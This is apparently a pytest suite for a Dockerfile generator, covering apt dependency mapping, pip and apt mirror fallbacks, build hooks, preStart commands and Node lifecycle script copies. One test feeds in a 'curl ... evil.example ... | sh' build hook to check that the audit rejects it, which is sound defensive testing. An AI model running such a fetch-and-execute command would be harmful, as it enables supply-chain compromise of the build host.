    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    # opencv -> libgl1 libglib2.0-0; pyzbar -> libzbar0
    assert "libgl1" in content
    assert "libglib2.0-0" in content
    assert "libzbar0" in content
    # 系统包装入单条带 cache mount 的 apt RUN（切源链会多次写 apt-get）
    assert content.count("--mount=type=cache,target=/var/cache/apt") == 1


def test_apt_deps_with_extras_and_version_constraints(workspace: Workspace) -> None:
    """IMP-054：带 extras 与版本约束的包名也能正确匹配。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "pyzbar[scripts]==0.1.9\nopencv-python-headless>=4.8.0,<5.0\n",
        encoding="utf-8",
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "libzbar0" in content
    assert "libgl1" in content


@pytest.mark.parametrize(
    ("requirement", "expected_apt_dep"),
    [
        ("opencv_python==4.10.0", "libgl1"),
        ("python.magic>=0.4.27", "libmagic1"),
    ],
)
def test_apt_deps_normalize_equivalent_distribution_names(
    workspace: Workspace, requirement: str, expected_apt_dep: str
) -> None:
    """PEP 503 等价包名写法同样应命中系统依赖映射。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        f"{requirement}\n", encoding="utf-8"
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")

    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")

    assert expected_apt_dep in content


def test_apt_deps_strips_comments_and_environment_markers(workspace: Workspace) -> None:
    """IMP-054：注释行与环境标记不影响包名解析。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "# barcode scanning\npyzbar>=0.1.9 ; python_version >= '3.10'\npillow>=11.0.0  # imaging\n",
        encoding="utf-8",
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "libzbar0" in content


def test_apt_deps_block_uses_cache_mount(workspace: Workspace) -> None:
    """issue #35：apt 块使用 BuildKit cache mount，不再 rm lists。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "pyzbar>=0.1.9\n", encoding="utf-8"
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "--mount=type=cache,target=/var/cache/apt,sharing=locked" in content
    assert "rm -rf /var/lib/apt/lists/*" not in content


def test_apt_deps_respect_apt_mirror(workspace: Workspace) -> None:
    """IMP-054：启用 aptMirror 时 apt 块也走镜像。"""
    from local_webpage_access.config import BuildMirrors, Config

    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "requirements.txt").write_text(
        "pyzbar>=0.1.9\n", encoding="utf-8"
    )
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    cfg = Config()
    cfg.buildMirrors = BuildMirrors(enabled=True, aptMirror="mirrors.aliyun.com")
    content = generate_dockerfile(m, workspace, config=cfg).read_text(encoding="utf-8")
    assert "mirrors.aliyun.com" in content
    assert "libzbar0" in content


def test_apt_deps_no_requirements_file(workspace: Workspace) -> None:
    """IMP-054：无 requirements 文件时不报错，不生成 apt 块。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install .", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "apt-get install -y --no-install-recommends libzbar0" not in content


def test_extract_requirements_file_glued_dash_r() -> None:
    """BUG-526：pip install -rrequirements.txt 无空格也能解析文件名。"""
    from local_webpage_access.dockerfile_templates import _extract_requirements_file

    assert _extract_requirements_file("pip install -rrequirements-prod.txt") == (
        "requirements-prod.txt"
    )
    assert _extract_requirements_file("pip install -r requirements.txt") == ("requirements.txt")
    assert _extract_requirements_file("pip install --registry https://example.com/simple .") == (
        "requirements.txt"
    )


# ---- issue#7：构建钩子 buildHooks / 启动前命令 preStart ----------------------


def test_node_build_hooks_render_run_layers(workspace: Workspace) -> None:
    """issue#7：node 渲染器在依赖安装/构建层之后、CMD 之前逐条生成 RUN <hook>。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        kind=Kind.NODE,
        install="npm ci",
        build="npm run build",
        start="npm start",
        build_hooks=["node scripts/gen_version.js", "npm run postbuild"],
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "RUN node scripts/gen_version.js" in content
    assert "RUN npm run postbuild" in content
    idx_hook = content.index("RUN node scripts/gen_version.js")
    assert idx_hook > content.index("RUN npm ci")
    assert idx_hook > content.index("RUN npm run build")
    assert idx_hook < content.index("CMD ")


def test_python_build_hooks_render_run_layers(workspace: Workspace) -> None:
    """issue#7：python 渲染器在依赖安装层之后、CMD 之前逐条生成 RUN <hook>。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        build_hooks=["python scripts/build_skills_bundle.py"],
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "RUN python scripts/build_skills_bundle.py" in content
    idx_hook = content.index("RUN python scripts/build_skills_bundle.py")
    assert idx_hook > content.index("pip install -r requirements.txt")
    # 钩子在完整源码 COPY 之后（需要源码在场）、CMD 之前
    assert idx_hook > content.index("COPY current/ ./")
    assert idx_hook < content.index("CMD ")


def test_generic_build_hooks_render_run_layers(workspace: Workspace) -> None:
    """issue#7：generic 兜底渲染器同样支持 buildHooks。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        kind=Kind.STATIC,
        start="./start.sh",
        build_hooks=["echo prepare"],
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    idx_hook = content.index("RUN echo prepare")
    assert idx_hook > content.index("COPY current/ ./")
    assert idx_hook < content.index("CMD ")


def test_pre_start_renders_shell_cmd(workspace: Workspace) -> None:
    """issue#7：声明 preStart 时 CMD 变为 sh -c \"<preStart> && exec <start>\"。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        pre_start="alembic upgrade head",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert 'CMD ["sh", "-c", "alembic upgrade head && exec uvicorn main:app"]' in content


def test_pre_start_combined_with_shell_operator_start(workspace: Workspace) -> None:
    """issue#7 + BUG-471：preStart 与含 shell 操作符的 start 组合走同一条 shell CMD 路径。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="python -m uvicorn main:app || python fallback.py",
        pre_start="alembic upgrade head",
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert (
        'CMD ["sh", "-c", '
        '"alembic upgrade head && exec python -m uvicorn main:app || python fallback.py"]'
    ) in content


def test_no_pre_start_keeps_exec_form(workspace: Workspace) -> None:
    """issue#7：未声明 preStart 时 CMD 保持既有 exec 形式（行为不变）。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert 'CMD ["uvicorn", "main:app"]' in content
    assert '"sh", "-c"' not in content


def test_build_hooks_pipe_to_shell_rejected_by_audit(workspace: Workspace) -> None:
    """issue#7：钩子含 curl|sh 供应链风险指令时被 audit_dockerfile 拒绝落盘。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        build_hooks=["curl -fsSL http://evil.example/x.sh | sh"],
    )
    with pytest.raises(RuntimeError, match="critical"):
        generate_dockerfile(m, workspace)


# ---- issue #18：pip 下载可靠性（备用源 / 超时重试 / 失败提示）----------------


def test_pip_run_china_default_tries_aliyun_then_pypi_then_tencent() -> None:
    """issue #18：china 默认顺序阿里源 → 官方源 → 腾讯源，每源 --retries 3，|| 切源。

    extra-index-url 不能在主源慢但包存在时切走；|| 覆盖主源硬故障。
    """
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=True, preset="china").resolved()
    out = _pip_run("pip install -r requirements.txt", mirrors=mirrors)
    aliyun = "https://mirrors.aliyun.com/pypi/simple"
    official = "https://pypi.org/simple"
    tencent = "https://mirrors.cloud.tencent.com/pypi/simple"
    assert out.index(aliyun) < out.index(official) < out.index(tencent)
    assert out.count(f"-i {aliyun}") >= 1
    assert out.count(f"-i {official}") >= 1
    assert out.count(f"-i {tencent}") >= 1
    assert out.count("||") >= 2
    assert out.count("--retries 3") >= 3
    assert "--timeout 60" in out
    assert "--extra-index-url" not in out
    # 每源独立括号，避免与外层失败提示 ``||`` 抢优先级
    assert "( pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple" in out
    assert "( pip install -r requirements.txt -i https://pypi.org/simple" in out
    assert "( pip install -r requirements.txt -i https://mirrors.cloud.tencent.com/pypi/simple" in out


def test_pip_run_official_path_still_gets_retries_timeout() -> None:
    """issue #18：关闭镜像（官方源）也注入超时/重试，无 -i / 切源链。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=False).resolved()
    assert mirrors.pip is None
    assert mirrors.pipFallbacks == []

    out = _pip_run("pip install -r requirements.txt", mirrors=mirrors)
    assert "-i " not in out
    assert "--extra-index-url" not in out
    assert "--retries 3" in out
    assert "--timeout 60" in out


def test_pip_run_empty_fallbacks_disables_chain() -> None:
    """issue #18：pipFallbacks 显式空列表只走主源。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=True, preset="china", pipFallbacks=[]).resolved()
    out = _pip_run("pip install -r requirements.txt", mirrors=mirrors)
    assert "-i https://mirrors.aliyun.com/pypi/simple" in out
    assert "-i https://pypi.org/simple" not in out
    assert "mirrors.cloud.tencent.com" not in out
    assert "--retries 3" in out


def test_pip_run_custom_primary_and_fallbacks_respected() -> None:
    """issue #18：主源与切源列表均可配置覆盖。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(
        enabled=True,
        preset="china",
        pip="https://pypi.tuna.tsinghua.edu.cn/simple",
        pipFallbacks=["https://mirrors.cloud.tencent.com/pypi/simple"],
        pipRetries=3,
    ).resolved()
    out = _pip_run("pip install -r requirements.txt", mirrors=mirrors)
    assert "-i https://pypi.tuna.tsinghua.edu.cn/simple" in out
    assert "-i https://mirrors.cloud.tencent.com/pypi/simple" in out
    assert "mirrors.aliyun.com" not in out


def test_pip_run_user_provided_flags_not_duplicated() -> None:
    """issue #18：用户自带 --retries/--timeout 时不重复注入，切源链仍展开。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=True, preset="china").resolved()
    out = _pip_run(
        "pip install -r requirements.txt --retries 3 --timeout 30",
        mirrors=mirrors,
    )
    assert "--retries 3" in out
    assert "--retries 5" not in out
    assert "--timeout 30" in out
    assert "-i https://pypi.org/simple" in out


def test_pip_run_wraps_failure_hint(workspace: Workspace) -> None:
    """issue #18：安装失败时输出可行动换源提示（build 日志可见），且括号包裹
    不改变原命令语义。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=True, preset="china").resolved()
    out = _pip_run(
        "pip install pipenv && pipenv install --system --skip-lock",
        mirrors=mirrors,
    )
    assert "> /tmp/lwa-pip.log 2>&1" in out
    assert "buildMirrors" in out
    assert 'exit "$status"' in out
    assert "Failed building wheel" in out
    assert "( pip install pipenv" in out


def test_pip_run_uv_segment_chains_index_and_timeout() -> None:
    """issue #18：uv 段按同一源列表 || 切换 UV_DEFAULT_INDEX。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=True, preset="china").resolved()
    out = _pip_run("uv sync", mirrors=mirrors)
    assert "UV_DEFAULT_INDEX=https://mirrors.aliyun.com/pypi/simple uv sync" in out
    assert "UV_DEFAULT_INDEX=https://pypi.org/simple uv sync" in out
    assert "UV_HTTP_TIMEOUT=60" in out
    assert "UV_EXTRA_INDEX_URL" not in out


def test_pip_run_pipenv_segment_gets_timeout() -> None:
    """issue #18：pipenv 段注入 PIP_DEFAULT_TIMEOUT 并按源列表切换镜像。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _pip_run

    mirrors = BuildMirrors(enabled=True, preset="china").resolved()
    out = _pip_run("pipenv install --system --skip-lock", mirrors=mirrors)
    assert "PIPENV_PYPI_MIRROR=https://mirrors.aliyun.com/pypi/simple pipenv install" in out
    assert "PIP_DEFAULT_TIMEOUT=60" in out


def test_generated_dockerfile_carries_pip_resilience(workspace: Workspace) -> None:
    """issue #18：端到端——生成 Dockerfile 的 pip 层带三源 || 链与 retries 3。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "-i https://mirrors.aliyun.com/pypi/simple" in content
    assert "-i https://pypi.org/simple" in content
    assert "-i https://mirrors.cloud.tencent.com/pypi/simple" in content
    assert "--retries 3" in content
    assert "--timeout 60" in content
    assert "--extra-index-url" not in content


def test_system_deps_render_before_copy(workspace: Workspace) -> None:
    """issue #35：systemDeps 在 COPY current/ 之前，并带 apt 切源链。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        system_deps=["ffmpeg"],
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "ffmpeg" in content
    idx_apt = content.index("ffmpeg")
    idx_copy = content.index("COPY current/ ./")
    assert idx_apt < idx_copy
    assert "mirrors.tuna.tsinghua.edu.cn" in content
    assert "Acquire::Retries" in content


def test_apt_build_hook_is_not_auto_rewritten(workspace: Workspace) -> None:
    """CHK-326：不因 hook 含 apt-get 自动改写；系统包走 systemDeps。"""
    workspace.ensure_app_dirs("api")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        build_hooks=["apt-get update && apt-get install -y --no-install-recommends ffmpeg"],
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "RUN apt-get update && apt-get install -y --no-install-recommends ffmpeg" in content
    # 未套 apt 切源链（那是 systemDeps 的职责）
    hook_idx = content.index("RUN apt-get update && apt-get install")
    hook_line = content[hook_idx : content.index("\n", hook_idx)]
    assert "debian.sources" not in hook_line
    assert "Acquire::Retries" not in hook_line


def test_pip_install_dot_splits_when_pyproject_exists(workspace: Workspace) -> None:
    """issue #35 建议 6：pip install . 且有 [project] 时拆依赖层。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "pyproject.toml").write_text(
        '[project]\nname="demo"\nversion="0.1.0"\ndependencies=["fastapi"]\n',
        encoding="utf-8",
    )
    (workspace.app_current("api") / "package.json").write_text("{}", encoding="utf-8")
    m = _mk_manifest(install="pip install .", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/pyproject.toml ./" in content
    assert "pip install . --no-deps" in content
    assert "COPY current/package*.json ./" in content
    first_full = content.index("COPY current/ ./")
    assert content.index("COPY current/pyproject.toml ./") < first_full
    assert content.index("COPY current/package*.json ./") < first_full
    assert content.index("pip install . --no-deps") > first_full


def test_pip_install_dot_keeps_full_copy_for_path_deps(workspace: Workspace) -> None:
    """CHK-326：路径/动态依赖不能安全拆层，保留整包 COPY + pip install .。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "pyproject.toml").write_text(
        '[project]\nname="demo"\nversion="0.1.0"\n'
        'dependencies=["local-lib @ file://localhost/tmp/lib"]\n',
        encoding="utf-8",
    )
    m = _mk_manifest(install="pip install .", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "COPY current/pyproject.toml ./" not in content
    assert "pip install . --no-deps" not in content
    assert "COPY current/ ./" in content
    assert "pip install ." in content


def test_pip_install_dot_extras_not_split(workspace: Workspace) -> None:
    """BUG-660：extras / 附加参数 / 后续 shell 必须保留，不能改成 pip install . --no-deps。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "pyproject.toml").write_text(
        '[project]\nname="demo"\nversion="0.1.0"\ndependencies=["fastapi"]\n',
        encoding="utf-8",
    )
    install = (
        "pip install .[worker] --config-settings editable_mode=compat && touch /app/setup-done"
    )
    m = _mk_manifest(install=install, start="uvicorn main:app")
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "pip install .[worker]" in content
    assert "editable_mode=compat" in content
    assert "touch /app/setup-done" in content
    assert "pip install . --no-deps" not in content


def test_second_apt_layer_restores_official_sources(workspace: Workspace) -> None:
    """BUG-661：官方源备份只写一次，后续层不得用已切镜像覆盖。"""
    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "package.json").write_text("{}", encoding="utf-8")
    (workspace.app_current("api") / "requirements.txt").write_text("pyzbar\n", encoding="utf-8")
    m = _mk_manifest(
        install="pip install -r requirements.txt",
        start="uvicorn main:app",
        system_deps=["ffmpeg"],
    )
    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
    assert "[ ! -f /tmp/lwa-official-debian.sources ]" in content
    assert "cp /tmp/lwa-official-debian.sources /etc/apt/sources.list.d/debian.sources" in content
    # 可变备份路径不得每层无条件覆盖官方快照
    assert "cp /etc/apt/sources.list.d/debian.sources /tmp/lwa-debian.sources" not in content


# ---------------------------------------------------------------------------
# DEV-146（S3-07）：apt 每个源候选的总时间预算 aptBudget
# ---------------------------------------------------------------------------


def _budget_mirrors(budget: int, **kw):
    from local_webpage_access.config import BuildMirrors

    return BuildMirrors(
        enabled=True, preset="china", aptBudget=budget, **kw
    ).resolved()


def test_apt_budget_default_keeps_legacy_render() -> None:
    """未配置预算（默认 0）时渲染与旧版逐字一致：不引入 timeout / download-only。"""
    from local_webpage_access.dockerfile_templates import _render_apt_deps_block

    out = _render_apt_deps_block(["ffmpeg"], _budget_mirrors(0))
    assert "timeout -k" not in out
    assert "--download-only" not in out
    assert (
        "apt-get -o Acquire::Retries=2 -o Acquire::http::Timeout=30 update && "
        "apt-get -o Acquire::Retries=2 -o Acquire::http::Timeout=30 "
        "install -y --no-install-recommends --fix-missing ffmpeg"
    ) in out


def test_apt_budget_wraps_network_phase_per_source_candidate() -> None:
    """设置预算后：每个源候选各自 timeout 包住 update + download-only，dpkg 安装离线随后执行。"""
    from local_webpage_access.dockerfile_templates import _apt_hosts, _render_apt_deps_block

    mirrors = _budget_mirrors(120)
    out = _render_apt_deps_block(["ffmpeg"], mirrors)
    hosts = _apt_hosts(mirrors)
    assert len(hosts) >= 2
    assert out.count("timeout -k 10 120 sh -c") == len(hosts)
    assert out.count("--download-only --fix-missing ffmpeg") == len(hosts)
    # 离线安装在 timeout 之外（不被预算打断，避免 dpkg 半安装）
    offline = "&& apt-get -o Acquire::Retries=2 -o Acquire::http::Timeout=30 install -y --no-install-recommends --fix-missing ffmpeg"
    assert out.count(offline) == len(hosts)
    assert "aptBudget" in out


def test_apt_budget_applies_to_node_toolchain_layer(workspace: Workspace) -> None:
    """Python + 辅助 Node 项目的 Node 工具链 apt 层同样受预算约束。"""
    from local_webpage_access.config import default_config

    workspace.ensure_app_dirs("api")
    (workspace.app_current("api") / "package.json").write_text("{}", encoding="utf-8")
    cfg = default_config()
    cfg.buildMirrors = _budget_mirrors(90)
    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
    content = generate_dockerfile(m, workspace, config=cfg).read_text(encoding="utf-8")
    assert "timeout -k 10 90 sh -c" in content
    assert "--download-only ca-certificates curl xz-utils" in content


def test_apt_budget_validation_bounds() -> None:
    from pydantic import ValidationError

    from local_webpage_access.config import BuildMirrors

    assert BuildMirrors().aptBudget == 0
    assert BuildMirrors(aptBudget=3600).aptBudget == 3600
    for bad in (-1, 3601):
        with pytest.raises(ValidationError):
            BuildMirrors(aptBudget=bad)


def test_apt_budget_survives_resolved_even_when_mirrors_disabled() -> None:
    from local_webpage_access.config import BuildMirrors

    assert BuildMirrors(enabled=False, preset="none", aptBudget=45).resolved().aptBudget == 45
    assert BuildMirrors(enabled=True, aptBudget=45).resolved().aptBudget == 45


def _run_apt_body(tmp_path: Path, apt_script: str, budget: int):
    """用假 apt-get 在真实 sh 中执行 ``_apt_body``，验证超时/退出码语义。"""
    import subprocess

    from local_webpage_access.dockerfile_templates import _apt_body

    bindir = tmp_path / "bin"
    bindir.mkdir()
    log = tmp_path / "calls.log"
    fake = bindir / "apt-get"
    fake.write_text(
        "#!/bin/sh\n"
        f'echo "$@" >> {log}\n'
        + apt_script,
        encoding="utf-8",
    )
    fake.chmod(0o755)
    body = _apt_body("--fix-missing demo", _budget_mirrors(budget))
    proc = subprocess.run(
        ["sh", "-ec", body],
        env={"PATH": f"{bindir}:/usr/bin:/bin", "HOME": str(tmp_path)},
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    calls = log.read_text(encoding="utf-8").splitlines() if log.exists() else []
    return proc, calls


needs_timeout_bin = pytest.mark.skipif(
    shutil.which("timeout") is None, reason="需要 coreutils timeout"
)


@needs_timeout_bin
def test_apt_budget_kills_hanging_fetch_and_reports(tmp_path: Path) -> None:
    """update 挂住 -> 到点被终止，退出码非 0，输出预算提示，且不进入离线安装。"""
    # 预算取 3s 而非 1s：macOS 首次执行新建脚本有安全扫描延迟，过紧会让假 apt-get 来不及记录。
    started = time.monotonic()
    proc, calls = _run_apt_body(tmp_path, "sleep 30\n", budget=3)
    elapsed = time.monotonic() - started
    assert proc.returncode != 0
    assert "总时间预算" in proc.stderr
    assert elapsed < 20, f"应在预算附近终止，实际 {elapsed:.1f}s"
    assert not any("install" in call for call in calls)


@needs_timeout_bin
def test_apt_budget_does_not_misreport_ordinary_failure(tmp_path: Path) -> None:
    """源 503 等普通失败原样透传退出码，不误报“预算超时”。"""
    proc, _calls = _run_apt_body(tmp_path, "exit 100\n", budget=30)
    assert proc.returncode == 100
    assert "总时间预算" not in proc.stderr


@needs_timeout_bin
def test_apt_budget_success_downloads_then_installs_offline(tmp_path: Path) -> None:
    proc, calls = _run_apt_body(tmp_path, "exit 0\n", budget=30)
    assert proc.returncode == 0
    assert len(calls) == 3  # update、download-only、离线 install
    assert "--download-only" in calls[1]
    assert "--download-only" not in calls[2]


# ---- DOC-201（V0.9.7）：Node(alpine) 消费 systemDeps --------------------------


def _node_manifest(mid: str = "nodedemo") -> InstanceManifest:
    manifest = make_container_manifest(mid, kind=Kind.NODE)
    manifest.entry = EntryConfig(
        install="npm ci", build="npm run build", start="node dist/index.js"
    )
    return manifest


def test_node_system_deps_rendered_before_install(workspace) -> None:
    """systemDeps 以 apk 安装，且必须位于 npm 依赖安装层之前（node-gyp 场景）。"""
    manifest = _node_manifest()
    manifest.systemDeps = ["python3", "make", "g++"]
    out = generate_dockerfile(manifest, workspace)
    text = out.read_text(encoding="utf-8")
    assert "RUN apk add --no-cache python3 make g++" in text
    assert text.index("apk add") < text.index("RUN npm ci")


def test_node_without_system_deps_rendering_unchanged(workspace) -> None:
    """systemDeps 为空时不产生 apk 层（默认渲染保持逐字不变）。"""
    manifest = _node_manifest()
    out = generate_dockerfile(manifest, workspace)
    assert "apk add" not in out.read_text(encoding="utf-8")


# ---- BUG-850（V0.9.7）：安装脚本引用的项目文件随依赖层先行复制 ---------------


def _bug850_project(current, *, preinstall="sh probe.sh", with_scripts_dir=False):
    import json as _json

    (current / "package.json").write_text(
        _json.dumps(
            {
                "name": "native-probe",
                "scripts": {
                    "preinstall": preinstall,
                    "build": "node build.js",
                    "start": "node server.js",
                },
            }
        ),
        encoding="utf-8",
    )
    (current / "probe.sh").write_text("#!/bin/sh\necho probe\n", encoding="utf-8")
    (current / "build.js").write_text("console.log('build')\n", encoding="utf-8")
    (current / "server.js").write_text(
        "require('http').createServer((q,s)=>{s.end('{\"ok\":true}')}).listen(3000)\n",
        encoding="utf-8",
    )
    if with_scripts_dir:
        (current / "scripts").mkdir(exist_ok=True)
        (current / "scripts/ensure-mirror.mjs").write_text(
            "export const mirror = 1\n", encoding="utf-8"
        )


def test_install_script_referenced_root_file_copied_before_npm_ci(workspace) -> None:
    """BUG-850：`preinstall: sh probe.sh` —— probe.sh 必须先于 RUN npm ci 复制。"""
    manifest = _node_manifest("bug850a")
    current = workspace.app_current("bug850a")
    current.mkdir(parents=True, exist_ok=True)
    _bug850_project(current)

    out = generate_dockerfile(manifest, workspace)
    text = out.read_text(encoding="utf-8")
    assert "COPY current/probe.sh probe.sh" in text
    assert text.index("COPY current/probe.sh") < text.index("RUN npm ci")


def test_install_script_referenced_dir_copied_whole(workspace) -> None:
    """引用 scripts/ 内文件 → 整目录拷贝（兄弟 import 也可用）。"""
    manifest = _node_manifest("bug850b")
    current = workspace.app_current("bug850b")
    current.mkdir(parents=True, exist_ok=True)
    _bug850_project(
        current,
        preinstall="node scripts/ensure-mirror.mjs",
        with_scripts_dir=True,
    )

    out = generate_dockerfile(manifest, workspace)
    text = out.read_text(encoding="utf-8")
    assert "COPY current/scripts/ scripts/" in text
    assert text.index("COPY current/scripts/") < text.index("RUN npm ci")


def test_install_script_referencing_missing_file_keeps_rendering(workspace) -> None:
    """引用不存在的路径不追加 COPY（渲染保持不变，不破坏层缓存）。"""
    manifest = _node_manifest("bug850c")
    current = workspace.app_current("bug850c")
    current.mkdir(parents=True, exist_ok=True)
    _bug850_project(current, preinstall="sh does-not-exist.sh")
    (current / "probe.sh").unlink()

    out = generate_dockerfile(manifest, workspace)
    text = out.read_text(encoding="utf-8")
    assert "COPY current/probe.sh" not in text
    assert "COPY current/package*.json ./" in text


def test_no_lifecycle_scripts_rendering_unchanged(workspace) -> None:
    """无生命周期脚本 → 依赖层仍只有 package*.json（逐字不变）。"""
    manifest = _node_manifest("bug850d")
    current = workspace.app_current("bug850d")
    current.mkdir(parents=True, exist_ok=True)
    _bug850_project(current, preinstall="")
    (current / "probe.sh").unlink()

    out = generate_dockerfile(manifest, workspace)
    text = out.read_text(encoding="utf-8")
    assert "COPY current/probe.sh" not in text
    assert "COPY current/scripts/" not in text


@pytest.mark.parametrize("command", ["npm run build", "npm run-script build"])
def test_npm_script_name_is_not_copied_as_path(workspace, command) -> None:
    """prepare: npm run build 且已有 build/ 时，不得把脚本名当成 COPY 源。

    有构建命令时 .dockerignore 会排除 current/build，这条 COPY 会让构建因源不存在失败。
    """
    manifest = _node_manifest("bug856a")
    current = workspace.app_current("bug856a")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps(
            {
                "scripts": {
                    "prepare": command,
                    "build": "node build.js",
                    "start": "node server.js",
                }
            }
        ),
        encoding="utf-8",
    )
    (current / "build").mkdir()
    (current / "build" / "index.js").write_text("built\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/build/" not in text
    assert "COPY current/build " not in text


def test_ignore_scripts_skips_lifecycle_file_copies(workspace) -> None:
    """安装命令已带 --ignore-scripts 时，生命周期脚本不会执行，不再为它复制文件。"""
    manifest = _node_manifest("bug856b")
    manifest.entry.install = "npm ci --ignore-scripts"
    current = workspace.app_current("bug856b")
    current.mkdir(parents=True, exist_ok=True)
    _bug850_project(current)

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/probe.sh" not in text


@pytest.mark.parametrize("command", ["sh probe", "sh ./probe", "node run probe"])
def test_lifecycle_file_named_like_npm_script_is_still_copied(workspace, command) -> None:
    """只有 npm run 的脚本名应跳过，同名的真实脚本文件仍须先复制。"""
    manifest = _node_manifest("script-file")
    current = workspace.app_current(manifest.id)
    current.mkdir(parents=True)
    (current / "package.json").write_text(
        json.dumps({"scripts": {"preinstall": command, "probe": "echo probe"}}),
        encoding="utf-8",
    )
    (current / "probe").write_text("#!/bin/sh\necho probe\n", encoding="utf-8")
    (current / "run").write_text("console.log('probe')\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/probe probe" in text
    assert text.index("COPY current/probe probe") < text.index("RUN npm ci")
    if command.startswith("node "):
        assert "COPY current/run run" in text


def test_lifecycle_copies_follow_source_subdir_not_repo_root(workspace) -> None:
    """sourceSubdir=server 时，根级辅助 package.json 的脚本不得生成 current/server/ 下不存在的 COPY。"""
    manifest = _node_manifest("bug856c")
    manifest.sourceSubdir = "server"
    current = workspace.app_current("bug856c")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps({"scripts": {"prepare": "node scripts/tools.js"}}),
        encoding="utf-8",
    )
    (current / "scripts").mkdir()
    (current / "scripts" / "tools.js").write_text("console.log(1)\n", encoding="utf-8")
    server = current / "server"
    server.mkdir()
    (server / "package.json").write_text(
        json.dumps({"scripts": {"start": "node server.js"}}),
        encoding="utf-8",
    )
    (server / "server.js").write_text("console.log(1)\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/server/scripts/" not in text
    assert "COPY current/scripts/" not in text


def test_lifecycle_file_inside_source_subdir_is_copied(workspace) -> None:
    """子目录工程自己的生命周期脚本引用的文件，按 current/<subdir>/ 前缀复制。"""
    manifest = _node_manifest("bug856d")
    manifest.sourceSubdir = "server"
    manifest.entry.install = "npm ci"
